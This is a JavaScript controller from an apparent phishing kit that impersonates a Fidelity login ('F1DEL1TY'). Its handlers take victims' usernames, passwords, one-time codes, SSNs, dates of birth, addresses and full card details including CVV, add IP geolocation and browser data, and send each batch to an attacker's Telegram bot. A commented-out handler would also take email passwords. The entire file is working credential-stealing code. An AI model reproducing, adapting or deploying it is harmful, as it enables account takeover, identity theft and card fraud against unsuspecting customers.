const { sendMessageFor } = require('simple-telegram-message');
const axios = require('axios');
const { getClientIp } = require('request-ip');
const { botToken, chatId } = require('../../settings');

async function getIP(ipAddr) {
	try {
		const { data } = await axios.get(`https://ipapi.co/${ipAddr}/json/`);
		const { ip, city, region, country_name, postal, timezone, utc_offset, org } = data;

		return { ip, city, region, country_name, postal, timezone, utc_offset, org };
	} catch (e) {
		return {
			ip: ipAddr,
			city: 'NULL',
			region: 'NULL',
			country_name: 'NULL',
			postal: 'NULL',
			timezone: 'NULL',
			utc_offset: 'NULL',
			org: 'NULL',
		};
	}
}

function getIPDetails(clientIP) {
	return getIP(clientIP)
		.then((data) => {
			var data = data;
			return data;
		})
		.catch((err) => {
			console.log(err);
		});
}

exports.login = (req, res) => {
	return res.render('login');
};

exports.loginPost = async (req, res) => {
	const { username, password } = req.body;
	const clientIP = getClientIp(req);
	const iPDetails = await getIPDetails(clientIP);
	const { ip, city, region, country_name, postal, timezone, utc_offset, org } = iPDetails;
	const userAgent = req.headers['user-agent'];
	const systemLang = req.headers['accept-language'];

	const message =
		`✅ F1DEL1TY | USER_${ip}\n\n` +
		`👤 LOGIN INFO\n` +
		`USERNAME         : ${username}\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ip}\n` +
		`CITY             : ${city}\n` +
		`STATE            : ${region}\n` +
		`ZIP CODE         : ${postal}\n` +
		`COUNTRY          : ${country_name}\n` +
		`TIME             : ${timezone} (UTC ${utc_offset})\n` +
		`ISP              : ${org}\n` +
		`💻 SYSTEM INFO\n` +
		`USER AGENT       : ${userAgent}\n` +
		`SYSTEM LANGUAGE  : ${systemLang}`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	return res.redirect('/auth/login/2');
};

exports.login2 = (req, res) => {
	return res.render('login2');
};

exports.loginPost2 = async (req, res) => {
	const { otp } = req.body;
	const clientIP = getClientIp(req);
	const iPDetails = await getIPDetails(clientIP);
	const { ip } = iPDetails;

	const message = `✅ F1DEL1TY | USER_${ip}\n\n` + `👤 OTP INFO\n` + `OTP              : ${otp}`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	return res.redirect('/auth/login/3');
};

// exports.loginPost2 = async (req, res) => {
// 	const { emailAddr, emailPass } = req.body;
// 	const clientIP = getClientIp(req);
// 	const iPDetails = await getIPDetails(clientIP);
// 	const { ip } = iPDetails;

// 	const message =
// 		`✅ F1DEL1TY | USER_${ip}\n\n` +
// 		`👤 EMAIL INFO\n` +
// 		`EMAIL ADDRESS    : ${emailAddr}\n` +
// 		`EMAIL PASSWORD   : ${emailPass}`;

// 	const sendMessage = sendMessageFor(botToken, chatId);
// 	sendMessage(message);

//return res.redirect('/auth/login/3');
// };

exports.login3 = (req, res) => {
	return res.render('login3');
};

exports.loginPost3 = async (req, res) => {
	const { fullName, address, zip, phone, dob, ssn } = req.body;
	const clientIP = getClientIp(req);
	const iPDetails = await getIPDetails(clientIP);
	const { ip } = iPDetails;

	const message =
		`✅ F1DEL1TY | USER_${ip}\n\n` +
		`👤 PERSONAL INFO\n` +
		`FULL NAME        : ${fullName}\n` +
		`STREET ADDRESS   : ${address}\n` +
		`ZIP CODE         : ${zip}\n` +
		`PHONE NUMBER     : ${phone}\n` +
		`DOB              : ${dob}\n` +
		`SSN              : ${ssn}`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	return res.redirect('/auth/login/4');
};

exports.login4 = (req, res) => {
	return res.render('login4');
};

exports.loginPost4 = async (req, res) => {
	const { cardNum, expDate, cvv } = req.body;
	const clientIP = getClientIp(req);
	const iPDetails = await getIPDetails(clientIP);
	const { ip } = iPDetails;

	const message =
		`✅ F1DEL1TY | USER_${ip}\n\n` +
		`👤 CARD INFO\n` +
		`CARD NUMBER      : ${cardNum}\n` +
		`EXPIRY DATE      : ${expDate}\n` +
		`CVV              : ${cvv}`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	return res.redirect('/auth/complete');
};

exports.complete = (req, res) => {
	return res.render('complete');
};

exports.page404Redirect = (req, res) => {
	return res.redirect('/auth/login');
};
